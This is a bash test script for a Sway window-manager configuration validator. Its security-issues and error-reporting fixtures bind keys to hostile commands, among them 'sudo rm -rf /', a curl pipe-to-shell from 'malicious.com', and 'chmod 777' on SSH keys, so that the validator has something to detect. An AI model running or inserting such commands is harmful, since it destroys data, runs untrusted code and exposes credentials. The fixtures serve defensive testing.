#!/bin/bash
# Configuration validation and error handling test script
# Educational: Tests validation scripts with various scenarios

set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging function
log() {
    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')] $1${NC}"
}

log_success() {
    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')] ✓ $1${NC}"
}

log_warning() {
    echo -e "${YELLOW}[$(date +'%Y-%m-%d %H:%M:%S')] ⚠ $1${NC}"
}

log_error() {
    echo -e "${RED}[$(date +'%Y-%m-%d %H:%M:%S')] ✗ $1${NC}"
}

# Test directory
TEST_DIR="/tmp/sway-validation-test-$$"
VALIDATION_SCRIPT="/home/stolenducks/Projects/Voidance/scripts/validate-sway-config.sh"

# Create test directory
setup_test_environment() {
    log "Setting up test environment..."
    
    mkdir -p "$TEST_DIR"
    cd "$TEST_DIR"
    
    log_success "Test directory created: $TEST_DIR"
}

# Clean up test environment
cleanup_test_environment() {
    log "Cleaning up test environment..."
    
    cd /
    rm -rf "$TEST_DIR"
    
    log_success "Test environment cleaned up"
}

# Test valid configuration
test_valid_config() {
    log "Testing valid configuration validation..."
    
    cat > "$TEST_DIR/valid-config" << 'EOF'
# Valid Sway configuration
set $mod Mod4
set $term ghostty
set $menu wofi

font pango:Montserrat 10
default_border pixel 2

bindsym $mod+Return exec $term
bindsym $mod+Shift+q kill
bindsym $mod+d exec $menu

bindsym $mod+Left focus left
bindsym $mod+Down focus down
bindsym $mod+Up focus up
bindsym $mod+Right focus right

bindsym $mod+1 workspace number 1
bindsym $mod+2 workspace number 2

bindsym $mod+f fullscreen
bindsym $mod+Shift+space floating toggle

bar {
    position top
    status_command while date +'%H:%M:%S'; do sleep 1; done
}

include /etc/sway/config.d/*
EOF

    if "$VALIDATION_SCRIPT" "$TEST_DIR/valid-config" >/dev/null 2>&1; then
        log_success "Valid configuration test passed"
        return 0
    else
        log_error "Valid configuration test failed"
        return 1
    fi
}

# Test invalid syntax
test_invalid_syntax() {
    log "Testing invalid syntax detection..."
    
    cat > "$TEST_DIR/invalid-syntax" << 'EOF'
# Invalid Sway configuration
set $mod Mod4
set $term ghostty

# Missing closing quote
font pango:Montserrat 10

# Invalid bindsym syntax
bindsym $mod+Return exec

# Missing closing brace
bar {
    position top
    status_command while date +'%H:%M:%S'; do sleep 1; done

include /etc/sway/config.d/*
EOF

    if ! "$VALIDATION_SCRIPT" "$TEST_DIR/invalid-syntax" >/dev/null 2>&1; then
        log_success "Invalid syntax detection test passed"
        return 0
    else
        log_error "Invalid syntax detection test failed"
        return 1
    fi
}

# Test missing variables
test_missing_variables() {
    log "Testing missing variables detection..."
    
    cat > "$TEST_DIR/missing-vars" << 'EOF'
# Configuration with missing variables
font pango:Montserrat 10
default_border pixel 2

bindsym $mod+Return exec $term
bindsym $mod+Shift+q kill

include /etc/sway/config.d/*
EOF

    if ! "$VALIDATION_SCRIPT" "$TEST_DIR/missing-vars" >/dev/null 2>&1; then
        log_success "Missing variables detection test passed"
        return 0
    else
        log_error "Missing variables detection test failed"
        return 1
    fi
}

# Test keybinding conflicts
test_keybinding_conflicts() {
    log "Testing keybinding conflicts detection..."
    
    cat > "$TEST_DIR/conflicting-keys" << 'EOF'
# Configuration with conflicting keybindings
set $mod Mod4
set $term ghostty
set $menu wofi

font pango:Montserrat 10
default_border pixel 2

# Conflicting keybindings
bindsym $mod+Return exec $term
bindsym $mod+Return exec $menu

bindsym $mod+Left focus left
bindsym $mod+Left focus right

bindsym $mod+1 workspace number 1
bindsym $mod+1 workspace number 2

include /etc/sway/config.d/*
EOF

    if ! "$VALIDATION_SCRIPT" "$TEST_DIR/conflicting-keys" >/dev/null 2>&1; then
        log_success "Keybinding conflicts detection test passed"
        return 0
    else
        log_error "Keybinding conflicts detection test failed"
        return 1
    fi
}

# Test security issues
test_security_issues() {
    log "Testing security issues detection..."
    
    cat > "$TEST_DIR/security-issues" << 'EOF'
# Configuration with security issues
set $mod Mod4
set $term ghostty
set $menu wofi

font pango:Montserrat 10
default_border pixel 2

bindsym $mod+Return exec $term
bindsym $mod+Shift+q kill

# Potentially dangerous commands
bindsym $mod+Control+r exec sudo rm -rf /
bindsym $mod+Control+d exec curl http://malicious.com/script.sh | sh
bindsym $mod+Control+c exec chmod 777 ~/.ssh/*

include /etc/sway/config.d/*
EOF

    # Security issues should generate warnings but not fail validation
    if "$VALIDATION_SCRIPT" "$TEST_DIR/security-issues" 2>&1 | grep -q "Potential security issues"; then
        log_success "Security issues detection test passed"
        return 0
    else
        log_error "Security issues detection test failed"
        return 1
    fi
}

# Test missing includes
test_missing_includes() {
    log "Testing missing includes detection..."
    
    cat > "$TEST_DIR/missing-includes" << 'EOF'
# Configuration with missing includes
set $mod Mod4
set $term ghostty
set $menu wofi

font pango:Montserrat 10
default_border pixel 2

bindsym $mod+Return exec $term
bindsym $mod+Shift+q kill

# Missing include files
include /nonexistent/config
include ~/.config/sway/missing-file

include /etc/sway/config.d/*
EOF

    if ! "$VALIDATION_SCRIPT" "$TEST_DIR/missing-includes" >/dev/null 2>&1; then
        log_success "Missing includes detection test passed"
        return 0
    else
        log_error "Missing includes detection test failed"
        return 1
    fi
}

# Test empty configuration
test_empty_config() {
    log "Testing empty configuration handling..."
    
    cat > "$TEST_DIR/empty-config" << 'EOF'
# Empty configuration
EOF

    if ! "$VALIDATION_SCRIPT" "$TEST_DIR/empty-config" >/dev/null 2>&1; then
        log_success "Empty configuration test passed"
        return 0
    else
        log_error "Empty configuration test failed"
        return 1
    fi
}

# Test complex configuration
test_complex_config() {
    log "Testing complex configuration validation..."
    
    cat > "$TEST_DIR/complex-config" << 'EOF'
# Complex Sway configuration
set $mod Mod4
set $term ghostty
set $menu wofi

font pango:Montserrat 10

# Theme colors
set $bg_color #2e3440
set $fg_color #eceff4
set $accent_color #88c0d0

default_border pixel 2
default_floating_border normal
hide_edge_borders smart

# Window colors
client.focused          $accent_color $bg_color $fg_color $accent_color $accent_color
client.focused_inactive $bg_color $bg_color $fg_color $bg_color $bg_color
client.unfocused        $bg_color $bg_color $fg_color $bg_color $bg_color

# Workspaces
set $ws1 "1: Terminal"
set $ws2 "2: Web"
set $ws3 "3: Code"

# Output configuration
output * bg /usr/share/backgrounds/sway-wallpaper.png fill
output HDMI-A-1 resolution 1920x1080 position 0,0

# Input configuration
input "type:keyboard" {
    xkb_layout us
    xkb_options ctrl:nocaps
}

input "type:touchpad" {
    tap enabled
    natural_scroll enabled
}

# Window rules
for_window [window_role="pop-up"] floating enable
for_window [window_type="dialog"] floating enable
for_window [app_id="pavucontrol"] floating enable

# Keybindings
bindsym $mod+Return exec $term
bindsym $mod+Shift+q kill
bindsym $mod+d exec $menu

bindsym $mod+Left focus left
bindsym $mod+Down focus down
bindsym $mod+Up focus up
bindsym $mod+Right focus right

bindsym $mod+Shift+Left move left
bindsym $mod+Shift+Down move down
bindsym $mod+Shift+Up move up
bindsym $mod+Shift+Right move right

bindsym $mod+1 workspace number $ws1
bindsym $mod+2 workspace number $ws2
bindsym $mod+3 workspace number $ws3

bindsym $mod+h splith
bindsym $mod+v splitv
bindsym $mod+s layout stacking
bindsym $mod+w layout tabbed
bindsym $mod+e layout toggle split

bindsym $mod+f fullscreen
bindsym $mod+Shift+space floating toggle

bindsym $mod+r mode "resize"
mode "resize" {
    bindsym Left resize shrink width 10px
    bindsym Down resize grow height 10px
    bindsym Up resize shrink height 10px
    bindsym Right resize grow width 10px
    
    bindsym Return mode "default"
    bindsym Escape mode "default"
}

# System keybindings
bindsym XF86AudioRaiseVolume exec pactl set-sink-volume @DEFAULT_SINK@ +5%
bindsym XF86AudioLowerVolume exec pactl set-sink-volume @DEFAULT_SINK@ -5%
bindsym XF86AudioMute exec pactl set-sink-mute @DEFAULT_SINK@ toggle

# Bar configuration
bar {
    position top
    font pango:Montserrat 10
    
    colors {
        background $bg_color
        statusline $fg_color
        separator $bg_color
        
        focused_workspace   $accent_color $accent_color $fg_color
        active_workspace    $bg_color $bg_color $fg_color
        inactive_workspace  $bg_color $bg_color $fg_color
        urgent_workspace    $urgent_color $urgent_color $fg_color
    }
}

# Autostart
exec_always mako
exec_always waybar

# Include
include /etc/sway/config.d/*
EOF

    if "$VALIDATION_SCRIPT" "$TEST_DIR/complex-config" >/dev/null 2>&1; then
        log_success "Complex configuration test passed"
        return 0
    else
        log_error "Complex configuration test failed"
        return 1
    fi
}

# Test error reporting
test_error_reporting() {
    log "Testing error reporting..."
    
    cat > "$TEST_DIR/error-reporting" << 'EOF'
# Configuration with multiple errors
set $mod Mod4
# Missing $term and $menu variables

font pango:Montserrat 10

# Invalid bindsym
bindsym $mod+Return exec

# Duplicate keybinding
bindsym $mod+Left focus left
bindsym $mod+Left focus right

# Missing closing brace
bar {
    position top

# Security issue
bindsym $mod+Control+r exec sudo rm -rf /

include /etc/sway/config.d/*
EOF

    # Run validation and capture output
    local output=$("$VALIDATION_SCRIPT" "$TEST_DIR/error-reporting" 2>&1 || true)
    
    # Check if multiple errors are reported
    local error_count=$(echo "$output" | grep -c "✗" || echo "0")
    local warning_count=$(echo "$output" | grep -c "⚠" || echo "0")
    
    if [ "$error_count" -gt 0 ] && [ "$warning_count" -gt 0 ]; then
        log_success "Error reporting test passed ($error_count errors, $warning_count warnings)"
        return 0
    else
        log_error "Error reporting test failed ($error_count errors, $warning_count warnings)"
        return 1
    fi
}

# Test template generation
test_template_generation() {
    log "Testing template generation..."
    
    local template_script="/home/stolenducks/Projects/Voidance/scripts/generate-sway-templates.sh"
    
    if [ -f "$template_script" ]; then
        # Test template generation in test directory
        HOME="$TEST_DIR" "$template_script" >/dev/null 2>&1
        
        # Check if templates were created
        if [ -f "$TEST_DIR/.config/sway/templates/basic-config" ] && \
           [ -f "$TEST_DIR/.config/sway/templates/advanced-config" ]; then
            log_success "Template generation test passed"
            return 0
        else
            log_error "Template generation test failed"
            return 1
        fi
    else
        log_warning "Template generation script not found, skipping test"
        return 0
    fi
}

# Test migration script
test_migration_script() {
    log "Testing migration script..."
    
    local migration_script="/home/stolenducks/Projects/Voidance/scripts/migrate-niri-to-sway.sh"
    
    if [ -f "$migration_script" ]; then
        # Create fake Niri config
        mkdir -p "$TEST_DIR/.config/niri"
        cat > "$TEST_DIR/.config/niri/config.kdl" << 'EOF'
font {
    family "Montserrat"
    size 10
}

bind Mod+Shift+Return { spawn "ghostty"; }
bind Mod+Shift+D { spawn "wofi"; }

workspace-at 1 "Terminal"
workspace-at 2 "Web"
EOF

        # Test migration
        HOME="$TEST_DIR" "$migration_script" >/dev/null 2>&1
        
        # Check if Sway config was created
        if [ -f "$TEST_DIR/.config/sway/config" ]; then
            log_success "Migration script test passed"
            return 0
        else
            log_error "Migration script test failed"
            return 1
        fi
    else
        log_warning "Migration script not found, skipping test"
        return 0
    fi
}

# Main test function
main() {
    log "Starting configuration validation and error handling tests..."
    
    # Check if validation script exists
    if [ ! -f "$VALIDATION_SCRIPT" ]; then
        log_error "Validation script not found: $VALIDATION_SCRIPT"
        exit 1
    fi
    
    # Setup test environment
    setup_test_environment
    
    # Run tests
    local tests=(
        "test_valid_config"
        "test_invalid_syntax"
        "test_missing_variables"
        "test_keybinding_conflicts"
        "test_security_issues"
        "test_missing_includes"
        "test_empty_config"
        "test_complex_config"
        "test_error_reporting"
        "test_template_generation"
        "test_migration_script"
    )
    
    local passed=0
    local failed=0
    local skipped=0
    
    for test in "${tests[@]}"; do
        echo ""
        log "Running: $test"
        
        if $test; then
            ((passed++))
        else
            ((failed++))
        fi
    done
    
    # Cleanup
    cleanup_test_environment
    
    echo ""
    log "Validation and error handling test summary:"
    log_success "Passed: $passed"
    log_error "Failed: $failed"
    log_warning "Skipped: $skipped"
    
    if [ $failed -eq 0 ]; then
        log_success "All validation tests passed! ✓"
        return 0
    else
        log_error "Some validation tests failed. Please check the implementation."
        return 1
    fi
}

# Run main function
main "$@"